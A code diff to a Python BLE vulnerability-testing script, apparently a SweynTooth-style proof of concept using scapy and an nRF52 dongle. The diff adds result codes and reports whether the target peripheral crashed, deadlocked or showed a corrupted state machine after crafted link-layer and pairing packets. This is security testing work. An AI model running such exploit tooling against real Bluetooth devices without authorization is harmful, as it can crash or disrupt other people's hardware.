@@ -14,12 +14,20 @@ from scapy.layers.bluetooth import *
 # timeout lib
 from timeout_lib import start_timeout, disable_timeout, update_timeout
 
+RETURN_CODE_ERROR = 0
+RETURN_CODE_NOT_VULNERABLE = 1
+RETURN_CODE_VULNERABLE = 2
+RETURN_CODE_UNDEFINED = 3
+RETURN_CODE_NONE_OF_4_STATE_OBSERVED = 4
+RETURN_CODE_NOT_TESTED = 5
+
 sleep(1.0)
 # Default master address
 master_address = '5d:36:ac:90:0b:22'
 access_address = 0x9a328370
 # Internal vars
 none_count = 0
+scan_count = 0
 end_connection = False
 connecting = False
 pairing_sent = False
@@ -29,6 +37,12 @@ miss_connections = 0
 slave_addr_type = 0
 # Autoreset colors
 colorama.init(autoreset=True)
+
+end_result = ""
+
+def set_end_result(result_code, result_data):
+    global end_result
+    end_result = "SBLEEDY_GONZALES DATA: code={code}, data={data} STOP".format(code=result_code, data=result_data)
 
 # Get serial port from command line
 if len(sys.argv) >= 2:
@@ -55,14 +69,16 @@ print(Fore.YELLOW + 'Advertiser Address: ' + advertiser_address.upper())
 def crash_timeout():
     print(Fore.RED + "No advertisement from " + advertiser_address.upper() +
           ' received\nThe device may have crashed!!!')
+    set_end_result(RETURN_CODE_VULNERABLE, "The device may have crashed")
 
 
 def scan_timeout():
-    global connecting, miss_connections, slave_addr_type
+    global connecting, miss_connections, slave_addr_type, scan_count
     scan_req = BTLE() / BTLE_ADV(RxAdd=slave_addr_type) / BTLE_SCAN_REQ(
         ScanA=master_address,
         AdvA=advertiser_address)
     driver.send(scan_req)
+    scan_count += 1
     start_timeout('scan_timeout', 2, scan_timeout)
     if connecting:
         connecting = False
@@ -73,6 +89,8 @@ def scan_timeout():
                              'We are receiving advertisements but no connection is possible\n'
                              'Check if the connection parameters are allowed by peripheral\n'
                              'or optionally check if device works normally with a mobile app again.')
+            set_end_result(RETURN_CODE_NOT_VULNERABLE, "No connection is possible")
+            print(end_result)
 
 
 # Open serial port of NRF52 Dongle
@@ -87,6 +105,10 @@ start_timeout('scan_timeout', 2, scan_timeout)
 
 print(Fore.YELLOW + 'Waiting advertisements from ' + advertiser_address)
 while True:
+    if scan_count > 10:
+        set_end_result(RETURN_CODE_NOT_VULNERABLE, "Device didn't deadlock")
+        print(end_result)
+        sys.exit(0)
     pkt = None
     # Receive packet from the NRF52 Dongle
     data = driver.raw_receive()
@@ -169,6 +191,8 @@ while True:
             else:
                 print(Fore.RED + 'Ooops, peripheral replied with a LL_FEATURE_RSP without corresponding request\n'
                                  'This means that the peripheral state machine was just corrupted!!!')
+                set_end_result(RETURN_CODE_VULNERABLE, "Peripheral replied with a LL_FEATURE_RSP without corresponding request")
+                print(end_result)
                 exit(0)
 
         elif LL_LENGTH_RSP in pkt or LL_UNKNOWN_RSP in pkt:
@@ -187,6 +211,8 @@ while True:
             elif LL_UNKNOWN_RSP not in pkt:
                 print(Fore.RED + 'Ooops, peripheral replied with a LL_FEATURE_RSP after we sent a pairing request\n'
                                  'This means that the peripheral state machine was just corrupted')
+                set_end_result(RETURN_CODE_VULNERABLE, "Peripheral replied with a LL_FEATURE_RSP after we sent a pairing request")
+                print(end_result)
                 exit(0)
 
         elif ATT_Read_By_Group_Type_Response in pkt or ATT_Exchange_MTU_Response in pkt:
@@ -194,6 +220,8 @@ while True:
                              "(we didn't send an ATT request)\n"
                              "This means that the peripheral state machine was just corrupted")
             print(Fore.YELLOW)
+            set_end_result(RETURN_CODE_VULNERABLE, "Device responded with an out of order ATT response")
+            print(end_result)
             exit(0)
 
         elif SM_Pairing_Response in pkt:
